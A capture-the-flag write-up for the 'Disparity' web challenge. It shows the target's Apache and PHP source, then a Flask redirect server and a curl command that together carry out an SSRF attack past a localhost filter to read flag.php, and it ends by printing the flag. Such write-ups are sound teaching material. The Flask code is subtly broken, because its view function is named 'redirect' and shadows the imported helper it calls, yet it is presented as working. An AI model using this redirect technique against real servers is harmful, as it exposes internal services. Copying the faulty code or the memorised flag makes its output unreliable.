# 🌐 Disparity

## Context

In this challenge, we are provided with a Flask web application, an Apache configuration, and two PHP files (`flag.php` and `url.php`). The goal is to exploit the application to bypass the Apache configuration and retrieve the flag.


## Objective

Perform an SSRF (Server-Side Request Forgery) attack to redirect the request to an internal service and retrieve the flag.

---

## Files

### Apache Configuration
```apache
<VirtualHost *:80>
    DocumentRoot /var/www/html/front
</VirtualHost>

<VirtualHost *:8080>
    DocumentRoot /var/www/html/back
    <Location />
        Require ip 127.0.0.1
    </Location>
</VirtualHost>

Listen 8080
```

### `flag.php`
```php
<?php

if ($_SERVER['HTTP_HOST'] === "localhost:8080"){
    echo getenv('FLAG');
} else {
    echo "You are not allowed to do that ";
}
?>
```

### `url.php`
```php
<?php

ini_set("default_socket_timeout", 5);

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("/url.php is only accessible with POST");
}

if (!isset($_POST['url']) || strlen($_POST['url']) === 0) {
    die("Parameter 'url' is mandatory");
}

$url = $_POST['url'];

try {
    $parsed = parse_url($url);
} catch (Exception $e){
    die("Failed to parse URL");
}

if (strlen($parsed['host']) === 0){
    die("Host can not be empty");
}

if ($parsed['scheme'] !== "http"){
    die("HTTP is the only option");
}

// Prevent DNS rebinding
try {
    $ip = gethostbyname($parsed['host']);
} catch(Exception $e) {
    die("Failed to resolve IP");
}

// Prevent from fetching localhost
if (preg_match("/^127\..*/",$ip) || $ip === "0.0.0.0"){
    die("Can't fetch localhost");
}

$url =  str_replace($parsed['host'],$ip,$url);

// Fetch url
try {
    ob_start();
    $len_content = readfile($url);
    $content = ob_get_clean();
} catch (Exception $e) {
    die("Failed to request URL");
}

if ($len_content > 0) {
    echo $content;
} else {
    die("Empty reply from server");
}

?>
```

---

## Solve

### Step 1: Understand the Application
The Apache configuration restricts access to the `/flag.php` endpoint to requests originating from `127.0.0.1`. The `url.php` file prevents direct access to localhost by validating the IP address and rejecting requests to `127.0.0.1`.

The Flask application, however, allows us to redirect requests to any URL, making it a potential entry point for an SSRF attack.

### Step 2: Set Up the Flask Server
We host the provided Flask application on our machine. The Flask server will redirect incoming requests to `http://localhost:8080/flag.php`.

```Python
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route('/')
def redirect():
    response = redirect("http://localhost:8080/flag.php", code=302)
    
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4444)
```

### Step 3: Exploit SSRF via `url.php`
We send a POST request to the `url.php` endpoint, passing the URL of our Flask server. The Flask server will then redirect the request to `http://localhost:8080/flag.php`, bypassing the Apache restriction.

Example POST request:
```bash
curl -X POST -d "url=http://<YOUR_IP>:4444/" http://target.com/url.php
```

Replace `<YOUR_IP>` with the IP address of your Flask server.

### Step 4: Retrieve the Flag
When the request is processed, the Flask server redirects it to `http://localhost:8080/flag.php`, which returns the flag. The flag is then sent back to us via the `url.php` response.


## Flag

```
MCTF{b82189df59a7ff9eee7447e4feb78165}
```
